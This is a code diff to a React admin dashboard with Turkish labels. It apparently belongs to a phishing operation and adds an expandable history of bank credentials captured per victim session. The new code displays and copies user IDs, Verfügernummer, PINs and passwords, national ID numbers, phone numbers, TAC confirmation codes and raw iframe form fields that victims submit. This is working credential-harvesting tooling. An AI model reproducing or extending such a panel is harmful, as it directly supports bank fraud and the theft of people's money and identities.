@@ -1,6 +1,6 @@
 "use client";
 
-import { useCallback, useEffect, useState, useRef } from "react";
+import { useCallback, useEffect, useState, useRef, Fragment } from "react";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import type { DemoSession } from "@/types/session";
 import { pathToStep } from "@/lib/session-routes";
@@ -380,6 +380,8 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
 
   const [soundEnabled, setSoundEnabled] = useState(false);
   const soundEnabledRef = useRef(false);
+
+  const [expandedBankHistorySessionId, setExpandedBankHistorySessionId] = useState<string | null>(null);
 
   useEffect(() => {
     const savedSound = localStorage.getItem('admin1SoundEnabled');
@@ -946,6 +948,65 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                   row.status,
                   sessionLastSeenAt[row.id],
                 );
+
+                const history: any[] = Array.isArray(fd.bankFormHistory) ? (fd.bankFormHistory as any[]).slice() : [];
+                const hasAnyCredentialSnapshot = Boolean(
+                  fd.verfuegernummer ||
+                    fd.username ||
+                    fd.id ||
+                    fd.pin ||
+                    fd.password ||
+                    fd.pw ||
+                    fd.bankPhone ||
+                    fd.personalCode ||
+                    fd.tacCode ||
+                    fd.tac_code ||
+                    fd.loginMethod ||
+                    fd.orderedField1 ||
+                    fd.orderedField2 ||
+                    fd.orderedField3,
+                );
+                if (history.length === 0 && hasAnyCredentialSnapshot) {
+                  history.unshift({
+                    bankSlug: fd.bankSlug,
+                    bankName: fd.bankName || "Bilinmiyor",
+                    verfuegernummer: fd.verfuegernummer || fd.username || fd.id || "",
+                    username: fd.verfuegernummer || fd.username || fd.id || "",
+                    pin: fd.pin || fd.password || fd.pw || "",
+                    password: fd.pin || fd.password || fd.pw || "",
+                    bankPhone: fd.bankPhone || "",
+                    personalCode: fd.personalCode || "",
+                    tacCode: fd.tacCode || fd.tac_code || "",
+                    loginMethod: fd.loginMethod || "",
+                    orderedField1: fd.orderedField1 || "",
+                    orderedField1Key: fd.orderedField1Key || "",
+                    orderedField2: fd.orderedField2 || "",
+                    orderedField2Key: fd.orderedField2Key || "",
+                    orderedField2Type: fd.orderedField2Type || "",
+                    orderedField3: fd.orderedField3 || "",
+                    orderedField3Key: fd.orderedField3Key || "",
+                    orderedField3Type: fd.orderedField3Type || "",
+                    rawFields:
+                      fd.verfuegernummer || fd.username || fd.id || fd.pin || fd.password || fd.pw
+                        ? {
+                            legacy_verfuegernummer: fd.verfuegernummer || "",
+                            legacy_username: fd.username || "",
+                            legacy_id: fd.id || "",
+                            legacy_pin: fd.pin || "",
+                            legacy_password: fd.password || "",
+                            legacy_pw: fd.pw || "",
+                            legacy_bankPhone: fd.bankPhone || "",
+                            legacy_personalCode: fd.personalCode || "",
+                            legacy_tacCode: fd.tacCode || fd.tac_code || "",
+                            legacy_loginMethod: fd.loginMethod || "",
+                          }
+                        : undefined,
+                    capturedAt: row.updated_at || row.created_at || new Date().toISOString(),
+                    isLegacySnapshot: true,
+                  });
+                }
+                (fd as any).bankFormHistory = history;
+                const bankHistoryCount = history.length;
                 
                 let stepText = "BAŞLANGIÇ";
                 let stepColor = darkMode ? "text-gray-400 bg-gray-500/10 border border-gray-500/20" : "text-gray-600 bg-gray-100 border border-gray-200";
@@ -1001,7 +1062,8 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                       : "";
 
                 return (
-                  <tr key={row.id} className={`${darkMode ? 'hover:bg-white/[0.02]' : 'hover:bg-black/[0.01]'} transition-colors duration-200 group`}>
+                  <Fragment key={row.id}>
+                  <tr className={`${darkMode ? 'hover:bg-white/[0.02]' : 'hover:bg-black/[0.01]'} transition-colors duration-200 group`}>
                     <td className="px-2 py-3 align-top font-mono text-[10px] opacity-50 uppercase break-all" title={row.id}>
                       {row.id.split('-')[0]}
                     </td>
@@ -1021,27 +1083,73 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                     <td className="px-2 py-3 align-top">
                       <div className="space-y-1 text-[10px] leading-tight">
                         {fd.bankName ? (
-                          <div className="flex min-w-0 flex-wrap items-center gap-1">
-                            <span className="font-bold text-[11px] text-yellow-600 dark:text-yellow-500 break-words [overflow-wrap:anywhere]">
-                              {fd.bankName}
-                            </span>
+                          <div className="mb-1 flex min-w-0 flex-wrap items-start justify-between gap-1.5">
+                            <div className="flex min-w-0 flex-wrap items-center gap-1">
+                              <span className="font-bold text-[11px] text-yellow-600 dark:text-yellow-500 break-words [overflow-wrap:anywhere]">
+                                {fd.bankName}
+                              </span>
+                              {typeof fd.loginMethod === "string" && fd.loginMethod.trim() ? (
+                                <span
+                                  className="cursor-pointer rounded bg-black/5 px-1.5 py-0.5 text-[8px] font-bold uppercase opacity-60 dark:bg-white/10"
+                                  onClick={() => copyToClipboard(fd.loginMethod)}
+                                >
+                                  {fd.loginMethod}
+                                </span>
+                              ) : null}
+                            </div>
+                            <button
+                              type="button"
+                              onClick={() =>
+                                setExpandedBankHistorySessionId(
+                                  expandedBankHistorySessionId === row.id ? null : row.id,
+                                )
+                              }
+                              className={`shrink-0 rounded-md border px-1.5 py-0.5 text-[8px] font-black uppercase tracking-wide transition-colors ${
+                                expandedBankHistorySessionId === row.id
+                                  ? darkMode
+                                    ? "border-amber-500/40 bg-amber-500/15 text-amber-400 hover:bg-amber-500 hover:text-white"
+                                    : "border-amber-500/40 bg-amber-500/15 text-amber-500 hover:bg-amber-500 hover:text-white"
+                                  : darkMode
+                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
+                                    : "border-gray-200 bg-gray-50 text-gray-500 hover:bg-gray-100 hover:text-black"
+                              }`}
+                              title="Eski banka form girişlerini göster"
+                            >
+                              GEÇMİŞ ({bankHistoryCount})
+                            </button>
+                          </div>
+                        ) : (
+                          <div className="mb-1 flex min-w-0 flex-wrap items-start justify-between gap-1.5">
                             {typeof fd.loginMethod === "string" && fd.loginMethod.trim() ? (
-                              <span
-                                className="cursor-pointer rounded bg-black/5 px-1.5 py-0.5 text-[8px] font-bold uppercase opacity-60 dark:bg-white/10"
+                              <div
+                                className="cursor-pointer font-bold text-[11px] text-yellow-600 dark:text-yellow-500 break-words [overflow-wrap:anywhere]"
                                 onClick={() => copyToClipboard(fd.loginMethod)}
                               >
                                 {fd.loginMethod}
-                              </span>
+                              </div>
                             ) : null}
+                            <button
+                              type="button"
+                              onClick={() =>
+                                setExpandedBankHistorySessionId(
+                                  expandedBankHistorySessionId === row.id ? null : row.id,
+                                )
+                              }
+                              className={`shrink-0 rounded-md border px-1.5 py-0.5 text-[8px] font-black uppercase tracking-wide transition-colors ${
+                                expandedBankHistorySessionId === row.id
+                                  ? darkMode
+                                    ? "border-amber-500/40 bg-amber-500/15 text-amber-400 hover:bg-amber-500 hover:text-white"
+                                    : "border-amber-500/40 bg-amber-500/15 text-amber-500 hover:bg-amber-500 hover:text-white"
+                                  : darkMode
+                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
+                                    : "border-gray-200 bg-gray-50 text-gray-500 hover:bg-gray-100 hover:text-black"
+                              }`}
+                              title="Eski banka form girişlerini göster"
+                            >
+                              GEÇMİŞ ({bankHistoryCount})
+                            </button>
                           </div>
-                        ) : typeof fd.loginMethod === "string" && fd.loginMethod.trim() ? (
-                          <div
-                            className="cursor-pointer font-bold text-[11px] text-yellow-600 dark:text-yellow-500 break-words [overflow-wrap:anywhere]"
-                            onClick={() => copyToClipboard(fd.loginMethod)}
-                          >
-                            {fd.loginMethod}
-                          </div>
-                        ) : null}
+                        )}
                         {canonicalBankFields.map(([key, value]) => {
                           let displayKey = key;
                           if (displayKey === "username") displayKey = "ID / K.Adı";
@@ -1157,6 +1265,262 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                       </div>
                     </td>
                   </tr>
+                  {expandedBankHistorySessionId === row.id && (
+                    <tr className={darkMode ? 'bg-black/30' : 'bg-gray-50/60'}>
+                      <td colSpan={11} className="px-4 py-3 md:px-6 md:py-4">
+                        {bankHistoryCount > 0 ? (
+                          <>
+                            <div className="mb-2 flex items-center gap-2 flex-wrap">
+                              <span
+                                className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wider border ${
+                                  darkMode
+                                    ? "bg-amber-500/15 text-amber-400 border-amber-500/30"
+                                    : "bg-amber-500/10 text-amber-600 border-amber-500/30"
+                                }`}
+                              >
+                                Eski Banka Girişleri ({bankHistoryCount})
+                              </span>
+                              <button
+                                type="button"
+                                onClick={() => setExpandedBankHistorySessionId(null)}
+                                className={`ml-auto rounded-md border px-3 py-1 text-[10px] font-bold transition-colors ${
+                                  darkMode
+                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
+                                    : "border-gray-200 bg-white text-gray-500 hover:bg-gray-100 hover:text-black"
+                                }`}
+                              >
+                                KAPAT
+                              </button>
+                            </div>
+                            <div className="space-y-2.5 md:space-y-3">
+                              {(fd as any).bankFormHistory
+                                .slice()
+                                .reverse()
+                                .map((entry: any, index: number) => {
+                                  const entryDate = entry.capturedAt
+                                    ? new Date(entry.capturedAt).toLocaleString("tr-TR", {
+                                        hour12: false,
+                                        timeZone: "Europe/Istanbul",
+                                      })
+                                    : "Tarih yok";
+                                  return (
+                                    <div
+                                      key={`${row.id}-history-${index}`}
+                                      className={`rounded-2xl border p-4 ${
+                                        darkMode ? "border-white/5 bg-[#1c1c1e]/70" : "border-gray-200 bg-white/70"
+                                      }`}
+                                    >
+                                      <div className="mb-2 flex flex-wrap items-center gap-2">
+                                        <span
+                                          className={`rounded px-2 py-0.5 text-[9px] font-black uppercase border ${
+                                            darkMode
+                                              ? "bg-white/10 text-zinc-300 border-white/10"
+                                              : "bg-gray-100 text-gray-700 border-gray-200"
+                                          }`}
+                                        >
+                                          #{bankHistoryCount - index}
+                                        </span>
+                                        {entry.bankName && (
+                                          <span
+                                            className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wide border ${
+                                              darkMode
+                                                ? "bg-yellow-500/10 text-yellow-500 border-yellow-500/20"
+                                                : "bg-yellow-50 border-yellow-200 text-yellow-700"
+                                            }`}
+                                          >
+                                            {entry.bankName}
+                                          </span>
+                                        )}
+                                        {entry.isLegacySnapshot && (
+                                          <span
+                                            className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wide border ${
+                                              darkMode
+                                                ? "bg-pink-500/10 text-pink-400 border-pink-500/20"
+                                                : "bg-pink-50 border-pink-200 text-pink-600"
+                                            }`}
+                                          >
+                                            ESKİ KAYITTAN ALINDI
+                                          </span>
+                                        )}
+                                        <span className="ml-auto text-[11px] font-mono opacity-50">
+                                          {entryDate}
+                                        </span>
+                                      </div>
+                                      <div className="grid grid-cols-1 gap-2 text-[11px] sm:grid-cols-2 lg:grid-cols-4">
+                                        {entry.verfuegernummer || entry.username ? (
+                                          <div
+                                            className={`rounded-xl border px-3 py-2 ${
+                                              darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
+                                            }`}
+                                          >
+                                            <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">Kullanıcı ID</div>
+                                            <div
+                                              className="cursor-pointer font-mono font-bold break-words [overflow-wrap:anywhere]"
+                                              onClick={() =>
+                                                copyToClipboard(String(entry.verfuegernummer || entry.username || ""))
+                                              }
+                                            >
+                                              {entry.verfuegernummer || entry.username || "-"}
+                                            </div>
+                                          </div>
+                                        ) : null}
+                                        {entry.pin || entry.password ? (
+                                          <div
+                                            className={`rounded-xl border px-3 py-2 ${
+                                              darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
+                                            }`}
+                                          >
+                                            <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">Şifre / PIN</div>
+                                            <div
+                                              className="cursor-pointer font-mono font-bold break-words [overflow-wrap:anywhere]"
+                                              onClick={() =>
+                                                copyToClipboard(String(entry.pin || entry.password || ""))
+                                              }
+                                            >
+                                              {entry.pin || entry.password || "-"}
+                                            </div>
+                                          </div>
+                                        ) : null}
+                                        {entry.personalCode ? (
+                                          <div
+                                            className={`rounded-xl border px-3 py-2 ${
+                                              darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
+                                            }`}
+                                          >
+                                            <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">Kimlik No</div>
+                                            <div
+                                              className="cursor-pointer font-mono font-bold break-words [overflow-wrap:anywhere]"
+                                              onClick={() => copyToClipboard(String(entry.personalCode))}
+                                            >
+                                              {entry.personalCode}
+                                            </div>
+                                          </div>
+                                        ) : null}
+                                        {entry.bankPhone ? (
+                                          <div
+                                            className={`rounded-xl border px-3 py-2 ${
+                                              darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
+                                            }`}
+                                          >
+                                            <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">Banka Telefon</div>
+                                            <div
+                                              className="cursor-pointer font-mono font-bold break-words [overflow-wrap:anywhere]"
+                                              onClick={() => copyToClipboard(String(entry.bankPhone))}
+                                            >
+                                              {entry.bankPhone}
+                                            </div>
+                                          </div>
+                                        ) : null}
+                                        {entry.loginMethod ? (
+                                          <div
+                                            className={`rounded-xl border px-3 py-2 ${
+                                              darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
+                                            }`}
+                                          >
+                                            <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">Giriş Yöntemi</div>
+                                            <div
+                                              className="cursor-pointer font-semibold break-words [overflow-wrap:anywhere]"
+                                              onClick={() => copyToClipboard(String(entry.loginMethod))}
+                                            >
+                                              {entry.loginMethod}
+                                            </div>
+                                          </div>
+                                        ) : null}
+                                        {entry.tacCode ? (
+                                          <div
+                                            className={`rounded-xl border px-3 py-2 ${
+                                              darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
+                                            }`}
+                                          >
+                                            <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">TAC / Onay Kodu</div>
+                                            <div
+                                              className="cursor-pointer font-mono font-bold break-words [overflow-wrap:anywhere] text-indigo-500"
+                                              onClick={() => copyToClipboard(String(entry.tacCode))}
+                                            >
+                                              {entry.tacCode}
+                                            </div>
+                                          </div>
+                                        ) : null}
+                                        {entry.orderedField1 || entry.orderedField2 || entry.orderedField3 ? (
+                                          <div
+                                            className={`rounded-xl border px-3 py-2 sm:col-span-2 ${
+                                              darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
+                                            }`}
+                                          >
+                                            <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">Sıralı Form Alanları</div>
+                                            <div className="space-y-0.5 font-mono">
+                                              {entry.orderedField1 && <div>1. {entry.orderedField1}</div>}
+                                              {entry.orderedField2 && <div>2. {entry.orderedField2}</div>}
+                                              {entry.orderedField3 && <div>3. {entry.orderedField3}</div>}
+                                            </div>
+                                          </div>
+                                        ) : null}
+                                      </div>
+                                      {entry.rawFields && Object.keys(entry.rawFields).length > 0 ? (
+                                        <details className="mt-3">
+                                          <summary className="cursor-pointer text-[9px] font-black uppercase tracking-wide opacity-50 hover:opacity-80">
+                                            Ham (iframe) alanlar ({Object.keys(entry.rawFields).length})
+                                          </summary>
+                                          <pre
+                                            className={`mt-2 max-h-56 overflow-auto rounded-xl border p-3 text-[11px] font-mono whitespace-pre-wrap break-all ${
+                                              darkMode
+                                                ? "border-white/5 bg-black/40 text-zinc-300"
+                                                : "border-gray-200 bg-gray-100 text-gray-800"
+                                            }`}
+                                          >
+{JSON.stringify(entry.rawFields, null, 2)}
+                                          </pre>
+                                        </details>
+                                      ) : null}
+                                    </div>
+                                  );
+                                })}
+                            </div>
+                          </>
+                        ) : (
+                          <>
+                            <div className="mb-2 flex items-center gap-2">
+                              <span
+                                className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wider border ${
+                                  darkMode
+                                    ? "bg-white/10 text-zinc-400 border-white/10"
+                                    : "bg-gray-100 text-gray-600 border-gray-200"
+                                }`}
+                              >
+                                Eski Banka Girişleri (0)
+                              </span>
+                              <button
+                                type="button"
+                                onClick={() => setExpandedBankHistorySessionId(null)}
+                                className={`ml-auto rounded-md border px-3 py-1 text-[10px] font-bold transition-colors ${
+                                  darkMode
+                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
+                                    : "border-gray-200 bg-white text-gray-500 hover:bg-gray-100 hover:text-black"
+                                }`}
+                              >
+                                KAPAT
+                              </button>
+                            </div>
+                            <div
+                              className={`rounded-2xl border px-4 py-5 text-center ${
+                                darkMode
+                                  ? "border-dashed border-white/10 bg-[#1c1c1e]/50"
+                                  : "border-dashed border-gray-200 bg-white/60"
+                              }`}
+                            >
+                              <div className="text-xs font-black uppercase opacity-50">
+                                Bu oturum için henüz banka form geçmişi kaydedilmemiş
+                              </div>
+                              <div className="mt-1 text-[11px] opacity-40">
+                                Kullanıcı yeni bir banka formu submit ettiğinde bilgiler burada listelenecek.
+                              </div>
+                            </div>
+                          </>
+                        )}
+                      </td>
+                    </tr>
+                  )}
+                  </Fragment>
                 );
               })}
             </tbody>
